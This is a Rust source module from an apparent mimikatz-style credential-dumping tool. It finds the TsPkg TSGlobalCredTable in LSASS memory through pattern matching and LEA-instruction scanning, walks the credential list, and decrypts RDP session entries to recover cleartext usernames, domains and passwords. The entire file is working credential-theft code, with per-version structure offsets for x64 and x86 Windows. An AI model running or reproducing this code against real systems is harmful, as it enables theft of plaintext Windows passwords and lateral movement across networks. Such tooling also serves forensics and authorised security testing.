use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::{Arch, TspkgCredential, is_valid_user_ptr, read_ptr};
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// TsPkg pTsPrimary offset per Windows version (x64).
const TSPKG_PTS_PRIMARY_OFFSETS: &[u64] = &[
    0x90, // Win10 1507+ / Win11
    0x80, // Win8.1
    0x70, // Win8
    0x40, // Win7 SP1
];

/// x86 pTsPrimary offset candidates (smaller struct due to 4-byte pointers).
const TSPKG_PTS_PRIMARY_OFFSETS_X86: &[u64] = &[
    0x50, // Win10 1507+ x86
    0x48, // Win8.1 x86
    0x40, // Win8 x86
    0x24, // Win7 SP1 x86
];

/// Extract TsPkg credentials from tspkg.dll (unified x64/x86).
///
/// TsPkg stores credentials for Terminal Services (RDP) sessions.
/// On local console logons, TSGlobalCredTable is typically NULL.
pub fn extract_tspkg_credentials_arch(
    vmem: &dyn VirtualMemory,
    tspkg_base: u64,
    _tspkg_size: u32,
    keys: &CryptoKeys,
    arch: Arch,
) -> Result<Vec<(u64, TspkgCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, tspkg_base)?;
    let mut results = Vec::new();

    let Some(text) = pe.find_section(".text") else {
        return Ok(results);
    };
    let text_base = tspkg_base + u64::from(text.virtual_address);

    // Select patterns based on architecture
    let pattern_set = match arch {
        Arch::X64 => patterns::TSPKG_LOGON_SESSION_PATTERNS,
        Arch::X86 => patterns::TSPKG_LOGON_SESSION_PATTERNS_X86,
    };
    let label = match arch {
        Arch::X64 => "TSGlobalCredTable",
        Arch::X86 => "TSGlobalCredTable_x86",
    };

    let (pattern_addr, _) =
        match patterns::find_pattern(vmem, text_base, text.virtual_size, pattern_set, label) {
            Ok(r) => r,
            Err(e) => {
                log::info!("Could not find TsPkg pattern: {e}");
                return Ok(results);
            }
        };

    // Find TSGlobalCredTable address using arch-appropriate method
    let table_addr = find_table_from_leas(vmem, &pe, tspkg_base, pattern_addr, arch)?;
    log::info!("TsPkg TSGlobalCredTable at 0x{table_addr:x}");

    // TSGlobalCredTable is a PVOID - dereference to get the first list entry.
    let list_head = read_ptr(vmem, table_addr, arch).unwrap_or(0);
    if list_head == 0 {
        log::info!("TsPkg: TSGlobalCredTable is NULL (no RDP/TS credentials)");
        return Ok(results);
    }
    if !is_valid_user_ptr(list_head, arch) {
        log::info!("TsPkg: TSGlobalCredTable has invalid pointer: 0x{list_head:x}");
        return Ok(results);
    }

    log::info!("TsPkg: walking credential list from 0x{list_head:x}");

    // Walk the linked list. Each entry has Flink/Blink at +0x00.
    // The list terminates when Flink points back to the first entry.
    let mut current = list_head;
    let mut visited = std::collections::HashSet::new();

    loop {
        if visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        // Try each pTsPrimary offset variant
        let pts_primary = detect_tspkg_primary_ptr(vmem, current, arch);
        if pts_primary != 0 {
            if let Some(cred) = extract_primary_credential(vmem, keys, pts_primary, arch) {
                log::info!("TsPkg: user={} domain={}", cred.username, cred.domain);
                // LUID is not directly accessible from this structure in a reliable way,
                // so we use 0 and let finder.rs merge by username/domain
                results.push((0, cred));
            }
        }

        current = match read_ptr(vmem, current, arch) {
            Ok(f) if is_valid_user_ptr(f, arch) => f,
            _ => break,
        };
    }

    log::info!("TsPkg: found {} entries", results.len());
    Ok(results)
}

/// Auto-detect the pTsPrimary offset by trying each variant on the entry.
fn detect_tspkg_primary_ptr(vmem: &dyn VirtualMemory, entry: u64, arch: Arch) -> u64 {
    let offsets = match arch {
        Arch::X64 => TSPKG_PTS_PRIMARY_OFFSETS,
        Arch::X86 => TSPKG_PTS_PRIMARY_OFFSETS_X86,
    };

    for &offset in offsets {
        let Ok(ptr) = read_ptr(vmem, entry + offset, arch) else {
            continue;
        };
        if !is_valid_user_ptr(ptr, arch) {
            continue;
        }
        // Validate: the pointed-to structure should have a UNICODE_STRING (Credentials)
        // with reasonable Length and MaximumLength
        let len = vmem.read_virt_u16(ptr).unwrap_or(0) as usize;
        let max_len = vmem.read_virt_u16(ptr + 2).unwrap_or(0) as usize;
        if len > 0 && len <= 0x400 && max_len >= len {
            return ptr;
        }
    }
    0
}

/// Find TSGlobalCredTable address by scanning instructions near the pattern.
///
/// x64: scan for RIP-relative LEA instructions and find the one that dereferences
///      to a valid heap pointer (TSGlobalCredTable is a PVOID, not a LIST_ENTRY).
/// x86: scan for absolute address references, or fall back to scanning .data section.
fn find_table_from_leas(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    dll_base: u64,
    pattern_addr: u64,
    arch: Arch,
) -> Result<u64> {
    match arch {
        Arch::X64 => find_table_from_leas_x64(vmem, pattern_addr),
        Arch::X86 => {
            let Some(ds) = pe.find_section(".data") else {
                return Err(crate::error::VmkatzError::PatternNotFound(
                    "TsPkg x86: no .data section".to_string(),
                ));
            };
            let data_base = dll_base + u64::from(ds.virtual_address);
            let data_end = data_base + u64::from(ds.virtual_size);
            // Try absolute address references first, fall back to .data scan
            match patterns::find_list_via_abs(
                vmem,
                pattern_addr,
                dll_base,
                data_base,
                data_end,
                "tspkg_x86",
            ) {
                Ok(addr) => Ok(addr),
                Err(_) => find_tspkg_table_in_data(vmem, data_base, ds.virtual_size as usize, arch)
                    .ok_or_else(|| {
                        crate::error::VmkatzError::PatternNotFound(
                            "TsPkg x86: could not find TSGlobalCredTable in .data".to_string(),
                        )
                    }),
            }
        }
    }
}

/// x64: scan for RIP-relative LEA instructions that point to TSGlobalCredTable.
fn find_table_from_leas_x64(vmem: &dyn VirtualMemory, pattern_addr: u64) -> Result<u64> {
    let code = vmem.read_virt_bytes(pattern_addr, 0x80)?;
    let mut first_target = None;

    for i in 0..code.len().saturating_sub(7) {
        let is_lea = (code[i] == 0x48 || code[i] == 0x4C)
            && code[i + 1] == 0x8D
            && matches!(code[i + 2], 0x05 | 0x0D | 0x15);
        if !is_lea {
            continue;
        }

        let disp = i32::from_le_bytes([code[i + 3], code[i + 4], code[i + 5], code[i + 6]]);
        let rip_after = pattern_addr + i as u64 + 7;
        let target = (rip_after as i64 + i64::from(disp)) as u64;

        if first_target.is_none() {
            first_target = Some(target);
        }

        // Check if this target holds a valid heap pointer (TSGlobalCredTable is PVOID)
        if let Ok(val) = vmem.read_virt_u64(target) {
            if is_valid_user_ptr(val, Arch::X64) {
                // Verify: the pointed-to structure should have Flink/Blink
                if let Ok(flink) = vmem.read_virt_u64(val) {
                    if is_valid_user_ptr(flink, Arch::X64) {
                        log::debug!(
                            "TsPkg: found table via LEA at pattern+0x{i:02x} -> 0x{target:x} (deref=0x{val:x})"
                        );
                        return Ok(target);
                    }
                }
            }
        }
    }

    // No LEA target had a valid pointer - use the first one (table may be NULL)
    first_target.ok_or_else(|| {
        crate::error::VmkatzError::PatternNotFound(
            "No LEA instruction found near TsPkg pattern".to_string(),
        )
    })
}

/// Extract credentials from a KIWI_TS_PRIMARY_CREDENTIAL structure.
///
/// The structure has a single UNICODE_STRING `Credentials` at +0x00 which is an
/// encrypted blob. After decryption, the blob contains embedded UNICODE_STRINGs:
///   x64: +0x00 UserName(16) +0x10 DomainName(16) +0x20 Password(16)
///   x86: +0x00 UserName(8)  +0x08 DomainName(8)  +0x10 Password(8)
/// Buffer pointers within these UNICODE_STRINGs are offsets into the blob itself.
fn extract_primary_credential(
    vmem: &dyn VirtualMemory,
    keys: &CryptoKeys,
    pts_primary: u64,
    arch: Arch,
) -> Option<TspkgCredential> {
    let buf_ptr_offset: u64 = match arch {
        Arch::X64 => 8,
        Arch::X86 => 4,
    };

    // Read Credentials UNICODE_STRING at +0x00
    let enc_len = vmem.read_virt_u16(pts_primary).ok()? as usize;
    let enc_max = vmem.read_virt_u16(pts_primary + 2).ok()? as usize;
    let enc_buf = read_ptr(vmem, pts_primary + buf_ptr_offset, arch).ok()?;

    if enc_len == 0 || enc_len > 0x400 || enc_max < enc_len {
        return None;
    }
    if !is_valid_user_ptr(enc_buf, arch) {
        return None;
    }

    // Read MaximumLength bytes for correct cipher selection (size%8 -> 3DES vs AES)
    let read_len = if enc_max >= enc_len { enc_max } else { enc_len };
    let enc_data = vmem.read_virt_bytes(enc_buf, read_len).ok()?;
    let decrypted = crate::lsass::crypto::decrypt_credential(keys, &enc_data).ok()?;

    // Decrypted blob: 3 UNICODE_STRINGs of struct_size bytes each
    let struct_size: usize = match arch {
        Arch::X64 => 0x10,
        Arch::X86 => 0x08,
    };
    let min_blob_size = struct_size * 3;

    if decrypted.len() < min_blob_size {
        return None;
    }

    let username = read_blob_ustring(&decrypted, 0, arch);
    let domain = read_blob_ustring(&decrypted, struct_size, arch);
    let password = read_blob_ustring(&decrypted, struct_size * 2, arch);

    if username.is_empty() {
        return None;
    }

    Some(TspkgCredential {
        username,
        domain,
        password,
    })
}

/// Read a UNICODE_STRING embedded in a decrypted credential blob.
/// The Buffer field is an offset (not a VA) into the blob.
///
/// x64: struct is 16 bytes (Length:2 + MaxLength:2 + pad:4 + Buffer:8)
/// x86: struct is 8 bytes  (Length:2 + MaxLength:2 + Buffer:4)
fn read_blob_ustring(blob: &[u8], offset: usize, arch: Arch) -> String {
    let struct_size: usize = match arch {
        Arch::X64 => 0x10,
        Arch::X86 => 0x08,
    };
    let buf_field_offset: usize = match arch {
        Arch::X64 => 8,
        Arch::X86 => 4,
    };

    if offset + struct_size > blob.len() {
        return String::new();
    }
    let len = u16::from_le_bytes([blob[offset], blob[offset + 1]]) as usize;
    if len == 0 || len > 0x200 {
        return String::new();
    }

    let buf_off = match arch {
        Arch::X64 => u64::from_le_bytes(
            blob[offset + buf_field_offset..offset + buf_field_offset + 8]
                .try_into()
                .unwrap_or([0; 8]),
        ) as usize,
        Arch::X86 => u32::from_le_bytes(
            blob[offset + buf_field_offset..offset + buf_field_offset + 4]
                .try_into()
                .unwrap_or([0; 4]),
        ) as usize,
    };

    if buf_off + len > blob.len() {
        return String::new();
    }
    let data = &blob[buf_off..buf_off + len];
    crate::lsass::crypto::decode_utf16_le(data)
}

/// Fallback: find TSGlobalCredTable in .data by looking for a PVOID pointing to heap.
fn find_tspkg_table_in_data(
    vmem: &dyn VirtualMemory,
    data_base: u64,
    data_size: usize,
    arch: Arch,
) -> Option<u64> {
    let data_size = std::cmp::min(data_size, 0x10000);
    let data = vmem.read_virt_bytes(data_base, data_size).ok()?;
    let step = arch.ptr_size() as usize;

    for off in (0..data_size.saturating_sub(step * 2)).step_by(step) {
        let val = if arch == Arch::X86 {
            u64::from(u32::from_le_bytes(data[off..off + 4].try_into().ok()?))
        } else {
            u64::from_le_bytes(data[off..off + 8].try_into().ok()?)
        };

        if !is_valid_user_ptr(val, arch) || val == 0 {
            continue;
        }
        // Candidate: val should point to a struct with Flink/Blink at +0x00
        let flink = match read_ptr(vmem, val, arch) {
            Ok(f) if is_valid_user_ptr(f, arch) => f,
            _ => continue,
        };
        // Flink should also have valid flink/blink
        if read_ptr(vmem, flink, arch).is_err() {
            continue;
        }
        // Validate: try to detect pTsPrimary in the entry
        let ptr_check = detect_tspkg_primary_ptr(vmem, val, arch);
        if ptr_check != 0 {
            return Some(data_base + off as u64);
        }
    }
    None
}
